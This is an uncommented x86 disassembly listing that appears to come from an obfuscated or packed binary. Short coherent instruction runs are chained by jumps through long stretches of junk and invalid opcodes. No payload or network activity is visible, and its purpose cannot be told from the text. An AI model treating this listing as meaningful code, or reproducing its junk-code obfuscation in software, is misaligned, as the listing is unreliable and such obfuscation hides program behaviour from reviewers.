  413f38:	pushf  
  413f39:	lods   al,BYTE PTR ds:[esi]
  413f3a:	xor    bh,dl
  413f3c:	lods   al,BYTE PTR ds:[esi]
  413f3d:	(bad)  
  413f3f:	sti    
  413f40:	mov    ds:0xc5711d6e,al
  413f45:	cwde   
  413f46:	adc    ebp,DWORD PTR [edx-0x49]
  413f49:	push   ss
  413f4a:	lds    edx,FWORD PTR [ecx]
  413f4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f4d:	cmovbe edi,edx
  413f50:	cmc    
  413f51:	(bad)  
  413f52:	leave  
  413f53:	adc    cl,BYTE PTR [ecx+ecx*1+0x1d]
  413f57:	sub    ecx,DWORD PTR [eax-0x7f76d98]
  413f5d:	sub    ah,bh
  413f5f:	aaa    
  413f60:	or     dh,BYTE PTR [esi]
  413f62:	sti    
  413f63:	push   ebx
  413f64:	iret   
  413f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f66:	and    al,0x7b
  413f68:	mov    ah,0x48
  413f6a:	test   BYTE PTR [edi+eiz*1-0x53c711e3],0xe0
  413f72:	mov    ebp,0xa076c7ca
  413f77:	or     DWORD PTR [ebx-0x4b915d38],ebx
  413f7d:	sub    BYTE PTR [edi+0x34],dh
  413f80:	fwait
  413f81:	rcl    DWORD PTR [edx+edx*8-0xa737af9],1
  413f88:	jbe    0x413ff4
  413f8a:	and    esp,DWORD PTR [edx-0x1d5772e7]
  413f90:	out    dx,al
  413f91:	jbe    0x413f80
  413f93:	pop    esp
  413f94:	shr    DWORD PTR [edi-0x34f2be88],1
  413f9a:	mov    eax,0xde7d2245
  413f9f:	inc    ch
  413fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa2:	stc    
  413fa3:	mov    edx,0x214cf8ef
  413fa8:	repnz mov BYTE PTR [ebp-0x2d],ah
  413fac:	or     dh,BYTE PTR [esi+0x29]
  413faf:	mov    edx,0x4ddc8f32
  413fb4:	ds fcomip st,st(7)
  413fb7:	fild   WORD PTR [ecx]
  413fb9:	jae    0x413ff4
  413fbb:	mov    bh,0x2e
  413fbd:	pop    ebx
  413fbe:	cmp    dh,ah
  413fc0:	adc    edx,DWORD PTR [ecx-0x458b83d4]
  413fc6:	popf   
  413fc7:	mov    edx,0xbdf01921
  413fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fcd:	scas   eax,DWORD PTR es:[edi]
  413fce:	inc    ebp
  413fcf:	or     al,0xd8
  413fd1:	mov    ecx,DWORD PTR [ebp-0xc]
  413fd4:	imul   eax,ecx
  413fd7:	jmp    0x4140a2
  413fdc:	retf   0xe079
  413fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe0:	repz mov ebp,0x964f7fcf
  413fe6:	mov    dh,0x1c
  413fe8:	sar    ah,1
  413fea:	(bad)  
  413feb:	int    0x5d
  413fed:	fild   WORD PTR [eax]
  413fef:	add    BYTE PTR [esi+0x69000000],ch
  413ff5:	mov    bl,0x16
  413ff7:	xor    BYTE PTR [ebx-0x51],dl
  413ffa:	xchg   BYTE PTR [esi+esi*4-0x2966daf0],bh
  414001:	pop    ebp
  414002:	cli    
  414003:	out    0x17,al
  414005:	lea    edx,[edi-0x67f9fb67]
  41400b:	and    al,0x2b
  41400d:	lds    ecx,FWORD PTR [eax+0x5be40220]
  414013:	(bad)  
  414014:	jno    0x414037
  414016:	mov    dh,BYTE PTR [ebp-0x4399b539]
  41401c:	jmp    0x643e3ba2
  414021:	into   
  414022:	and    BYTE PTR [eax-0x39],cl
  414025:	adc    eax,0x39e6052c
  41402a:	jns    0x41408f
  41402c:	mov    ds:0x33294a65,eax
  414031:	jmp    0x3ed020f7
  414036:	sti    
  414037:	inc    ecx
  414038:	jecxz  0x4140b9
  41403a:	in     eax,dx
  41403b:	cmp    al,0x7c
  41403d:	(bad)  
  41403e:	clc    
  41403f:	in     al,dx
  414040:	lods   al,BYTE PTR ds:[esi]
  414041:	mov    DWORD PTR [ebx-0x4e20c47f],edx
  414047:	push   cs
  414048:	into   
  414049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41404a:	loop   0x414068
  41404c:	inc    edi
  41404d:	inc    esp
  41404e:	call   0xade56ba5
  414053:	mov    al,0xe2
  414055:	push   esp
  414056:	stc    
  414057:	stc    
  414058:	fisub  DWORD PTR [ebx-0x14db7e0]
  41405e:	icebp  
  41405f:	lahf   
  414060:	mov    bl,0x5
  414062:	push   edi
  414063:	fcomp  DWORD PTR [edx-0x6a6a310c]
  414069:	or     al,0xc9
  41406b:	cs mov ch,0x86
  41406e:	adc    BYTE PTR [edx-0x342d7b68],bl
  414074:	lea    edx,[ebp+0x79]
  414077:	fwait
  414078:	adc    DWORD PTR [ecx+ebp*1+0x48daf335],ecx
  41407f:	daa    
  414080:	rcr    bl,1
  414082:	fcomp  DWORD PTR [ebx]
  414084:	(bad)  
  414085:	cwde   
  414086:	sbb    al,0x8d
  414088:	push   ebx
  414089:	lock jle 0x4140db
  41408c:	cmp    dh,BYTE PTR [ebp-0x3d]
  41408f:	ins    BYTE PTR es:[edi],dx
  414090:	shr    BYTE PTR [ebx-0x1c],1
  414093:	aaa    
  414094:	int    0xf
  414096:	fiadd  WORD PTR [edx+0x77]
  414099:	pop    edi
  41409a:	rcr    BYTE PTR ds:0x7bd1741a,0x5a
  4140a1:	mov    ecx,DWORD PTR ss:[ebp-0x4]
  4140a5:	imul   eax,eax,0x7931
  4140ab:	xor    edx,edx
  4140ad:	jmp    0x414178
  4140b2:	pusha  
  4140b3:	xor    eax,0xdaf5dab5
  4140b8:	outs   dx,DWORD PTR ds:[esi]
  4140b9:	mov    edi,0x25fac69
  4140be:	maskmovq mm4,mm4
  4140c1:	add    cl,BYTE PTR [ebx]
  4140c3:	loopne 0x4140c5
  4140c5:	add    BYTE PTR [esi+0x6a000000],ch
  4140cb:	inc    eax
  4140cc:	repnz sub al,0xe6
  4140cf:	fwait
  4140d0:	jnp    0x41405c
  4140d2:	xchg   ebx,eax
  4140d3:	jmp    0xcfe5:0x9ff89a59
  4140da:	mov    al,0xbb
  4140dc:	jg     0x41412c
  4140de:	cli    
  4140df:	xchg   esi,eax
  4140e0:	pop    ds
  4140e1:	mov    cl,BYTE PTR [edi+0x7e]
  4140e4:	add    ebp,DWORD PTR ds:0xf21bb36
  4140ea:	pushf  
  4140eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140ec:	ins    BYTE PTR es:[edi],dx
  4140ed:	jl     0x4140c7
  4140ef:	dec    edi
  4140f0:	and    DWORD PTR [edx+ebp*8-0x1b5dcc8a],eax
  4140f7:	je     0x414147
  4140f9:	mov    al,ds:0x3c9eca5b
  4140fe:	jo     0x4140f5
  414100:	dec    esp
  414101:	daa    
  414102:	pop    es
  414103:	add    al,0x1d
  414105:	and    BYTE PTR [eax-0x3c],bh
  414108:	stc    
  414109:	xchg   edi,eax
  41410a:	in     al,dx
  41410b:	xor    BYTE PTR [ebp+0x38],bh
  41410e:	data16 lods al,BYTE PTR ds:[esi]
  414110:	ins    DWORD PTR es:[edi],dx
  414111:	sbb    BYTE PTR [esp+edi*8-0x3bda9e5d],0x44
  414119:	bound  esp,QWORD PTR [edi+0x5f12847]
  41411f:	jns    0x414199
  414121:	cmp    al,0xaa
  414123:	shr    DWORD PTR [edx-0x7a],1
  414126:	fcmove st,st(5)
  414128:	push   ebp
  414129:	add    al,0x83
  41412b:	aam    0x2c
  41412d:	dec    esi
  41412e:	jge    0x414128
  414130:	xchg   ebp,eax
  414131:	mov    eax,0x591d4b43
  414136:	inc    esi
  414137:	adc    eax,0x808419ee
  41413c:	mov    ch,cl
  41413e:	add    dl,BYTE PTR [ebp+0x66]
  414141:	(bad)  
  414142:	sbb    eax,0xb85f1131
  414147:	scas   al,BYTE PTR es:[edi]
  414148:	je     0x4140e7
  41414a:	retf   
  41414b:	mov    WORD PTR [edx-0x4a],es
  41414e:	adc    edi,edi
  414150:	cs cli 
  414152:	inc    edi
  414153:	or     DWORD PTR [eax+edx*8+0x47],ebp
  414157:	sar    DWORD PTR [ecx],1
  414159:	or     eax,0x380c60c5
  41415e:	fdiv   DWORD PTR [esi]
  414160:	icebp  
  414161:	das    
  414162:	push   ds
  414163:	sti    
  414164:	fdivr  DWORD PTR [edi+0x31933165]
  41416a:	xchg   ecx,eax
  41416b:	aad    0xa8
  41416d:	repz pop ebp
  41416f:	push   ecx
  414170:	mov    al,fs:0x8c5c9195
  414176:	xor    esi,DWORD PTR [ebx-0x13d20e09]
  41417c:	or     eax,DWORD PTR [eax]
  41417e:	add    cl,ch
  414180:	mov    BYTE PTR [eax],0x0
  414183:	add    BYTE PTR [eax],ah
  414185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414186:	mov    edx,0x259fbf9f
  41418b:	mov    edi,0x7026e067
  414190:	xchg   ebx,eax
  414191:	lock adc DWORD PTR [ecx+edi*4],ebx
  414195:	loopne 0x414197
  414197:	add    BYTE PTR [esi+0x19000000],ch
  41419d:	pop    eax
  41419e:	xchg   esi,eax
  41419f:	call   0x41bf75d
  4141a4:	mov    ebp,0xc57d8204
  4141a9:	in     al,dx
  4141aa:	stc    
  4141ab:	in     eax,dx
  4141ac:	fistp  QWORD PTR [ebx+0x20]
  4141af:	sbb    al,0x71
  4141b1:	cli    
  4141b2:	mov    eax,0xb0dbe818
  4141b7:	cmp    BYTE PTR [ebp+esi*8-0x1cb0343],bh
  4141be:	mov    edi,0xc655c6f0
  4141c3:	test   BYTE PTR [edx-0x6e],cl
  4141c6:	iret   
  4141c7:	std    
  4141c8:	jae    0x4141a3
  4141ca:	dec    esp
  4141cb:	mov    cl,0x1b
  4141cd:	loope  0x414157
  4141cf:	push   ecx
  4141d0:	sub    eax,0x576839b9
  4141d5:	bound  bp,DWORD PTR [ebx-0x63710214]
  4141dc:	jns    0x4141f4
  4141de:	mov    WORD PTR [ecx+0x79],cs
  4141e1:	mov    ebx,0x79b162c3
  4141e6:	xchg   esp,eax
  4141e7:	aas    
  4141e8:	xor    BYTE PTR [eax+0x10],dl
  4141eb:	popf   
  4141ec:	mov    ds,WORD PTR [ebp+0x3f]
  4141ef:	mov    dl,0x77
  4141f1:	sbb    BYTE PTR [edx-0x19],dl
  4141f4:	sti    
  4141f5:	xor    al,0x7a
  4141f7:	in     eax,0x82
  4141f9:	je     0x41425c
  4141fb:	adc    BYTE PTR [edx],ch
  4141fd:	cmp    al,0x73
  4141ff:	mov    al,ds:0xb3ba99f6
  414204:	(bad)  
  414205:	cmp    bl,dh
  414207:	les    ebx,FWORD PTR [edi+0x16b710f4]
  41420d:	and    esi,ebx
  41420f:	je     0x4141ac
  414211:	adc    ebx,DWORD PTR [edi-0x1]
  414214:	mov    eax,DWORD PTR [edi+0xe]
  414217:	xchg   ebx,eax
  414218:	jnp    0x41421d
  41421a:	pop    es
  41421b:	mov    bl,0x1c
  41421d:	fnstenv [esi]
  41421f:	add    al,0xd7
  414221:	fucomp st(3)
  414223:	fistp  WORD PTR [edx+esi*8-0x5d7cb2f9]
  41422a:	stos   DWORD PTR es:[edi],eax
  41422b:	mov    dl,0xa5
  41422d:	dec    esi
  41422e:	stos   BYTE PTR es:[edi],al
  41422f:	pop    ecx
  414230:	lods   al,BYTE PTR ds:[esi]
  414231:	pop    ebp
  414232:	je     0x41427c
  414234:	and    eax,0x813e133a
  414239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41423a:	jae    0x4141bc
  41423c:	xchg   esp,eax
  41423d:	inc    ebx
  41423e:	sub    ah,BYTE PTR cs:[eax+0xb]
  414242:	icebp  
  414243:	inc    esi
  414244:	mov    ds:0xef3c3fa9,eax
  414249:	jmp    0x4141d4
  41424b:	inc    ebp
  41424c:	fadd   st(7),st
  41424e:	inc    ebp
  41424f:	sar    BYTE PTR [edx],1
  414251:	fucomi st,st(0)
  414253:	push   0xffffffc7
  414255:	inc    ebp
  414256:	aam    0x2
  414258:	add    BYTE PTR [eax],al
  41425a:	add    bh,al
  41425c:	inc    ebp
  41425d:	fmul   st,st(6)
  41425f:	xor    DWORD PTR [eax],eax
  414261:	add    bh,al
  414263:	inc    ebp
  414264:	fsubr  QWORD PTR [ebx]
  414266:	add    BYTE PTR ds:[eax],al
  414269:	mov    DWORD PTR [ebp-0x20],0x4085
  414270:	mov    DWORD PTR [ebp-0x1c],0x490a
  414277:	mov    eax,DWORD PTR [ebp-0x20]
  41427a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41427d:	mov    edx,DWORD PTR [ebp-0x28]
  414280:	mov    esi,DWORD PTR [ebp-0x24]
  414283:	add    eax,0x445e
  414288:	adc    ecx,0x4392
  41428e:	or     eax,edx
  414290:	jmp    0x41435b
  414295:	mov    ebp,0x5fba57b1
  41429a:	(bad)  
  41429b:	std    
  41429c:	mov    bh,0xf4
  41429e:	ss jg  0x4142ae
  4142a1:	imul   esi,DWORD PTR [edx+eax*2+0xe1679f],0x0
  4142a9:	scas   al,BYTE PTR es:[edi]
  4142aa:	add    BYTE PTR [eax],al
  4142ac:	add    BYTE PTR [edx],dh
  4142ae:	test   eax,0x1fd1a9b7
  4142b3:	jbe    0x41423e
  4142b5:	xlat   BYTE PTR ds:[ebx]
  4142b6:	xchg   esi,eax
  4142b7:	mov    edi,0xa7ca220a
  4142bc:	or     eax,0x4dba9bc1
  4142c1:	scas   al,BYTE PTR es:[edi]
  4142c2:	fld    DWORD PTR [ebp+esi*2-0x32]
  4142c6:	lods   eax,DWORD PTR ds:[esi]
  4142c7:	es dec edi
  4142c9:	jbe    0x41431d
  4142cb:	test   al,0xda
  4142cd:	nop
  4142ce:	loopne 0x4142bd
  4142d0:	test   DWORD PTR [esi],0x74361d9c
  4142d6:	mov    ds:0x18e5d5f3,al
  4142db:	iret   
  4142dc:	in     al,0x6b
  4142de:	into   
  4142df:	cmc    
  4142e0:	jmp    0xe9e9:0x65aa7a85
  4142e7:	jns    0x414300
  4142e9:	xor    BYTE PTR [ebx],bh
  4142eb:	icebp  
  4142ec:	jle    0x41428e
  4142ee:	scas   eax,DWORD PTR es:[edi]
  4142ef:	push   DWORD PTR [edi-0x7d886991]
  4142f5:	pop    edx
  4142f6:	stc    
  4142f7:	std    
  4142f8:	lea    eax,[eax-0x38]
  4142fb:	jmp    0x6a8571c5
  414300:	or     dh,BYTE PTR [eax]
  414302:	(bad)  
  414303:	in     eax,dx
  414304:	les    eax,FWORD PTR [edi+0x5d]
  414307:	jmp    0x414384
  414309:	cmp    BYTE PTR [edx-0x6a4cd2e3],0x6
  414310:	fsub   DWORD PTR [edx-0x2457a037]
  414316:	scas   eax,DWORD PTR es:[edi]
  414317:	pop    eax
  414318:	dec    ebp
  414319:	inc    esp
  41431a:	ins    BYTE PTR es:[edi],dx
  41431b:	add    edx,DWORD PTR [edi+esi*1-0x49]
  41431f:	mov    DWORD PTR [edx],esp
  414321:	retf   
  414322:	pop    ds
  414323:	scas   eax,DWORD PTR es:[edi]
  414324:	lods   ax,WORD PTR ds:[esi]
  414326:	retf   0x9a6c
  414329:	shr    DWORD PTR [edx+0x19005c26],0x3e
  414330:	sti    
  414331:	or     edx,edx
  414333:	jmp    0xdd9767f7
  414338:	nop
  414339:	fs mov ?,edx
  41433c:	das    
  41433d:	std    
  41433e:	mov    esp,ecx
  414340:	push   0xae050e9d
  414345:	and    al,0x38
  414347:	add    eax,DWORD PTR [edx]
  414349:	daa    
  41434a:	inc    ecx
  41434b:	mov    ebx,0x9f100e4
  414350:	cmp    eax,0xca172537
  414355:	call   0x8b18:0xdcf530e5
  41435c:	push   ebp
  41435d:	ror    BYTE PTR [ebx],1
  41435f:	into   
  414360:	mov    esi,DWORD PTR [ebp-0x2c]
  414363:	push   esi
  414364:	push   edx
  414365:	push   ecx
  414366:	push   eax
  414367:	jmp    0x414432
  41436c:	out    0xc3,eax
  41436e:	pop    ebx
  41436f:	out    dx,eax
  414370:	jg     0x414371
  414372:	test   ebx,0x7016eeba
  414378:	jle    0x41430f
  41437a:	jmp    DWORD PTR [ecx+0xe215]
  414380:	scas   al,BYTE PTR es:[edi]
  414381:	add    BYTE PTR [eax],al
  414383:	add    BYTE PTR [ebx-0x4f],bl
  414386:	xchg   esi,eax
  414387:	imul   BYTE PTR [esp+ebp*8]
  41438a:	mov    ebx,0x1347d86c
  41438f:	retf   
  414390:	pop    edx
  414391:	xchg   esp,eax
  414392:	arpl   WORD PTR [ebp+ebp*8-0x30],di
  414396:	mov    bh,0x3b
  414398:	pop    ecx
  414399:	or     DWORD PTR [esi+0x1003d66e],eax
  41439f:	push   0x77e55432
  4143a4:	loope  0x41441c
  4143a6:	inc    ecx
  4143a7:	sub    al,0x95
  4143a9:	loop   0x4143f5
  4143ab:	mov    al,0x50
  4143ad:	xor    cl,BYTE PTR [ebx+0x3cfbbd7f]
  4143b3:	dec    esi
  4143b4:	aas    
  4143b5:	lods   eax,DWORD PTR ds:[esi]
  4143b6:	ins    DWORD PTR es:[edi],dx
  4143b7:	psubusb mm3,QWORD PTR ds:0x739e9187
  4143be:	nop
  4143bf:	dec    esi
  4143c0:	stc    
  4143c1:	pop    ds
  4143c2:	(bad)  
  4143c3:	mov    eax,ds:0x98e8eb8f
  4143c8:	or     ch,dl
  4143ca:	sbb    esi,esi
  4143cc:	and    eax,0x2d1a7514
  4143d1:	dec    ebx
  4143d2:	ror    BYTE PTR [ebx],1
  4143d4:	mov    DWORD PTR [ecx],ebx
  4143d6:	sbb    al,0x45
  4143d8:	cmp    edx,DWORD PTR [esi-0x14]
  4143db:	fisub  WORD PTR [ebx+0x5aaeb4d5]
  4143e1:	mov    dl,0x4f
  4143e3:	daa    
  4143e4:	xchg   ebx,eax
  4143e5:	pop    ss
  4143e6:	jb     0x4143cf
  4143e8:	inc    eax
  4143e9:	sub    BYTE PTR ds:0x5be546dc,dl
  4143ef:	mov    BYTE PTR [esi],0x61
  4143f2:	and    eax,0x497e56e9
  4143f7:	jge    0x4143d8
  4143f9:	outs   dx,DWORD PTR ds:[esi]
  4143fa:	push   esp
  4143fb:	(bad)  
  4143fc:	scas   al,BYTE PTR es:[edi]
  4143fd:	lock cmp eax,DWORD PTR [edx-0x696133d0]
  414404:	fmulp  st(2),st
  414406:	mov    ds:0x3f1510b9,eax
  41440b:	stos   DWORD PTR es:[edi],eax
  41440c:	idiv   BYTE PTR ds:0x5c706e9c
  414412:	in     al,0x33
  414414:	bound  esi,QWORD PTR [edx+0x15cc39eb]
  41441a:	aad    0x6f
  41441c:	fdiv   QWORD PTR [ebx-0x4d416883]
  414422:	clc    
  414423:	and    ecx,ecx
  414425:	(bad)  
  414426:	jno    0x4143b4
  414428:	dec    ebp
  414429:	pop    DWORD PTR [edi+ecx*8-0x3a]
  41442d:	rcl    BYTE PTR [ebx-0x5c],cl
  414430:	loope  0x414477
  414432:	call   0x423dad
  414437:	and    eax,0x5759
  41443c:	and    edx,0x4b06
  414442:	jmp    0x41450d
  414447:	mov    DWORD PTR [ebp-0x15],esi
  41444a:	push   ecx
  41444b:	(bad)  
  41444c:	fistp  QWORD PTR [ebx-0x61dfec03]
  414452:	or     eax,0xdd90a59
  414457:	ret    
  414458:	loop   0x41445a
  41445a:	add    BYTE PTR [esi-0x20000000],ch
  414460:	rcr    DWORD PTR [ebx-0x5adf9e09],1
  414466:	std    
  414467:	test   BYTE PTR [eax],dh
  414469:	push   es
  41446a:	je     0x4144d4
  41446c:	mov    BYTE PTR [ecx],0xa
  41446f:	loope  0x4144df
  414471:	push   es
  414472:	sbb    BYTE PTR [ecx],ah
  414474:	pop    edx
  414475:	sub    ch,dl
  414477:	cmp    BYTE PTR [edi+ebp*2],0xe5
  41447b:	sub    DWORD PTR es:[edi+0x45abb9a0],edi
  414482:	xchg   ecx,ebx
  414484:	add    eax,0x7078686d
  414489:	pop    ebp
  41448a:	and    dh,al
  41448c:	jmp    0xeaac7f08
  414491:	or     ah,BYTE PTR [esi-0x4]
  414494:	rol    BYTE PTR [ecx],cl
  414496:	pop    edi
  414497:	clc    
  414498:	pushf  
  414499:	push   ss
  41449a:	sbb    eax,0x18a4f04d
  41449f:	push   0xffffffe7
  4144a1:	call   0xe40e5d49
  4144a6:	ja     0x41448b
  4144a8:	out    0xd0,al
  4144aa:	push   cs
  4144ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144ac:	add    al,BYTE PTR [edx+0x695777b7]
  4144b2:	fcom   QWORD PTR [eax+0xe]
  4144b5:	xchg   ebx,eax
  4144b6:	lds    ebx,FWORD PTR [edx-0x1f]
  4144b9:	lods   eax,DWORD PTR ds:[esi]
  4144ba:	pop    es
  4144bb:	ror    ah,1
  4144bd:	jmp    FWORD PTR [ebx-0x55]
  4144c0:	ret    
  4144c1:	add    BYTE PTR [ebx+0x2f],bl
  4144c4:	push   0x7ff20379
  4144c9:	jnp    0x414496
  4144cb:	mov    ah,0x6f
  4144cd:	add    DWORD PTR [ebx-0x4d],edi
  4144d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144d1:	out    dx,eax
  4144d2:	icebp  
  4144d3:	stos   BYTE PTR es:[edi],al
  4144d4:	leave  
  4144d5:	rcl    DWORD PTR [ebp+0x75],cl
  4144d8:	pop    ebp
  4144d9:	in     al,0x9e
  4144db:	int    0xc9
  4144dd:	ret    
  4144de:	add    BYTE PTR [esi],cl
  4144e0:	or     al,0x66
  4144e2:	xchg   edi,eax
  4144e3:	sahf   
  4144e4:	sub    DWORD PTR [ecx-0x66a40735],0xfa62e683
  4144ee:	ret    
  4144ef:	inc    ebx
  4144f0:	add    DWORD PTR [ecx-0x5b],ebx
  4144f3:	and    BYTE PTR [esi],cl
  4144f5:	xor    al,0x20
  4144f7:	jecxz  0x414524
  4144f9:	in     al,0x25
  4144fb:	jmp    edx
  4144fd:	xor    ecx,DWORD PTR [ebp-0x16]
  414500:	retf   0xb3a1
  414503:	fcomp  QWORD PTR [edi-0x8ef8da6]
  414509:	adc    cl,dh
  41450b:	sbb    ebx,DWORD PTR [ebp+eax*1-0x463b]
  414512:	mov    DWORD PTR [ebp-0x20],eax
  414515:	adc    edx,0xffffffff
  414518:	mov    DWORD PTR [ebp-0x1c],edx
  41451b:	jmp    0x4145e6
  414520:	nop
  414521:	rol    al,0x18
  414524:	rcr    BYTE PTR [eax],1
  414526:	fmul   st,st(0)
  414528:	push   ebx
  414529:	ds (bad) 
  41452b:	int    0x1
  41452d:	mov    dl,0x65
  41452f:	(bad)  
  414530:	jno    0x414515
  414532:	add    BYTE PTR [eax],al
  414534:	scas   al,BYTE PTR es:[edi]
  414535:	add    BYTE PTR [eax],al
  414537:	add    BYTE PTR [eax],ah
  414539:	jae    0x414557
  41453b:	xor    ecx,esp
  41453d:	jmp    0x2636f5de
  414542:	xchg   esp,eax
  414543:	add    edx,DWORD PTR [eax+edi*2+0x2b]
  414547:	stos   DWORD PTR es:[edi],eax
  414548:	pop    ds
  414549:	stos   BYTE PTR es:[edi],al
  41454a:	daa    
  41454b:	mov    ds:0xf37ac24b,eax
  414550:	dec    ecx
  414551:	aad    0x2c
  414553:	mov    al,0xc
  414555:	ret    
  414556:	sub    edx,DWORD PTR [ecx]
  414558:	cwde   
  414559:	imul   eax,DWORD PTR ds:0x4e8522a2,0x626f76f4
  414563:	rol    BYTE PTR [edx-0x45635078],0x42
  41456a:	pop    esp
  41456b:	js     0x414535
  41456d:	and    BYTE PTR [ecx+edx*1-0x705ac19b],ah
  414574:	jmp    0x414551
  414576:	hlt    
  414577:	or     BYTE PTR [esi],al
  414579:	dec    ecx
  41457a:	je     0x4145f1
  41457c:	aad    0x35
  41457e:	push   eax
  41457f:	fnsave [esp+ecx*4+0x49f72dac]
  414586:	mov    ebx,0xdd7b7b06
  41458b:	and    eax,0xec913bca
  414590:	mov    al,0x23
  414592:	push   edx
  414593:	mov    ebx,0xc23f11ac
  414598:	adc    ecx,DWORD PTR [esi]
  41459a:	dec    esp
  41459b:	sub    eax,0x468f1992
  4145a0:	pop    esi
  4145a1:	(bad)  
  4145a2:	pop    edi
  4145a3:	in     eax,0x73
  4145a5:	and    bl,BYTE PTR [esi-0x3e]
  4145a8:	or     al,0xdc
  4145aa:	push   edi
  4145ab:	sub    ecx,esp
  4145ad:	es stos DWORD PTR es:[edi],eax
  4145af:	push   0x12
  4145b1:	sub    dh,dl
  4145b3:	sbb    esp,DWORD PTR [esi+ebp*2-0x54]
  4145b7:	mov    ebp,0x10b42e25
  4145bc:	inc    edx
  4145bd:	jecxz  0x41460e
  4145bf:	ret    0x6f53
  4145c2:	sub    edi,DWORD PTR [eax]
  4145c4:	add    eax,0xcc051657
  4145c9:	scas   al,BYTE PTR es:[edi]
  4145ca:	repz jl 0x414588
  4145cd:	pop    ds
  4145ce:	inc    edx
  4145cf:	dec    ebx
  4145d0:	push   ecx
  4145d1:	xor    eax,0xfc5457ba
  4145d6:	adc    edi,esi
  4145d8:	std    
  4145d9:	ds jmp 0x414567
  4145dc:	fwait
  4145dd:	aad    0x72
  4145df:	out    dx,al
  4145e0:	test   DWORD PTR [edi],edi
  4145e2:	das    
  4145e3:	cs cli 
  4145e5:	add    bh,0x45
  4145e8:	adc    BYTE PTR [esi],0x7b
  4145eb:	add    BYTE PTR [eax],al
  4145ed:	mov    DWORD PTR [ebp-0x44],0x21cb
  4145f4:	mov    DWORD PTR [ebp-0x78],0x1602
  4145fb:	jmp    0x4146c6
  414600:	aas    
  414601:	jns    0x4145d6
  414603:	push   edx
  414604:	xlat   BYTE PTR ds:[ebx]
  414605:	cli    
  414606:	mov    edi,0x42dbb67d
  41460b:	gs add eax,0x1fcd1097
  414611:	in     al,0x0
  414613:	add    BYTE PTR [esi-0x55000000],ch
  414619:	cmp    al,0x64
  41461b:	cmp    ebp,0x3aad002b
  414621:	mov    al,ds:0x5cd22088
  414626:	scas   al,BYTE PTR es:[edi]
  414627:	push   edx
  414628:	popf   
  414629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41462a:	aas    
  41462b:	inc    ebp
  41462c:	pop    ecx
  41462d:	in     al,0x1b
  41462f:	mov    al,ds:0x50119b04
  414634:	mov    al,0x61
  414636:	jmp    0x4145f4
  414638:	xor    edx,DWORD PTR [esi+0x3b]
  41463b:	lods   al,BYTE PTR ds:[esi]
  41463c:	sub    al,0x3f
  41463e:	xchg   ebp,eax
  41463f:	add    bh,BYTE PTR [edi-0x1aeafc3c]
  414645:	mov    ebx,0x7951b8aa
  41464a:	repnz into 
  41464c:	shl    BYTE PTR [edi+0x25],cl
  41464f:	add    al,0x1c
  414651:	fadd   DWORD PTR [esi-0x34f79962]
  414657:	call   0xee6:0x6946a499
  41465e:	mov    WORD PTR [ebp-0x42],ds
  414661:	lods   eax,DWORD PTR ds:[esi]
  414662:	mov    BYTE PTR [edx],cl
  414664:	cmp    eax,0xe2eff3c6
  414669:	cld    
  41466a:	arpl   bx,di
  41466c:	int    0xc4
  41466e:	adc    eax,0xd0c1bd49
  414673:	mov    DWORD PTR [edx+0x74e55b27],edi
  414679:	in     eax,0x15
  41467b:	mov    DWORD PTR [edi],ecx
  41467d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41467e:	xchg   ebx,eax
  41467f:	pop    ebx
  414680:	push   es
  414681:	(bad)
  414686:	push   eax
  414687:	jg     0x414679
  414689:	cmp    al,0xd5
  41468b:	xor    BYTE PTR [edx],ch
  41468d:	hlt    
  41468e:	test   DWORD PTR [edi+0x18],0x83a6f390
  414695:	call   0x80eb41f4
  41469a:	ja     0x4146d5
  41469c:	adc    al,0x3a
  41469e:	pop    ss
  41469f:	outs   dx,DWORD PTR ds:[esi]
  4146a0:	pop    edx
  4146a1:	shl    DWORD PTR ds:0x7dc93b2,1
  4146a7:	push   0xffffffe4
  4146a9:	sbb    al,0x4c
  4146ac:	pop    esp
  4146ad:	xchg   BYTE PTR [esi],dl
  4146af:	or     esp,ecx
  4146b1:	push   es
  4146b2:	fsubr  QWORD PTR [ecx-0x2a2cbf89]
  4146b8:	repz mov ah,0xc1
  4146bb:	jge    0x4146d4
  4146bd:	mov    eax,0x626961e7
  4146c2:	xchg   DWORD PTR [ecx+0x45c71757],esi
  4146c8:	mov    WORD PTR [edx+0x5b],ds
  4146cb:	add    BYTE PTR [eax],al
  4146cd:	mov    DWORD PTR [ebp-0x3c],0x394c
  4146d4:	mov    DWORD PTR [ebp-0x84],0x4db2
  4146de:	mov    DWORD PTR [ebp-0x58],0x3585
  4146e5:	mov    DWORD PTR [ebp-0x50],0x77d9
  4146ec:	mov    DWORD PTR [ebp-0x4],0x1
  4146f3:	jmp    0x4147be
  4146f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146f9:	imul   ebx,DWORD PTR [eax-0x410c20de],0x61d813ed
  414703:	int    0x3b
  414705:	xchg   ecx,esp
  414707:	aas    
  414708:	int    0xe4
  41470a:	add    BYTE PTR [eax],al
  41470c:	scas   al,BYTE PTR es:[edi]
  41470d:	add    BYTE PTR [eax],al
  41470f:	add    BYTE PTR [edi-0xd220cf8],ch
  414715:	out    0xc1,al
  414717:	outs   dx,BYTE PTR cs:[esi]
  414719:	sbb    eax,0xaa1967aa
  41471e:	sbb    ch,BYTE PTR [esi-0x54]
  414721:	jle    0x414788
  414723:	xchg   BYTE PTR [ecx+0x640c876e],dl
  414729:	je     0x4146d4
  41472b:	enter  0xf1a5,0x23
  41472f:	jbe    0x4146b8
  414731:	test   al,0x5
  414733:	lock cmp ebx,eax
  414736:	mov    DWORD PTR [ebx-0x29ab8ad7],0xe8815a68
  414740:	sbb    edx,DWORD PTR [ebp+0x29]
  414743:	rcr    BYTE PTR gs:[edi],0x3a
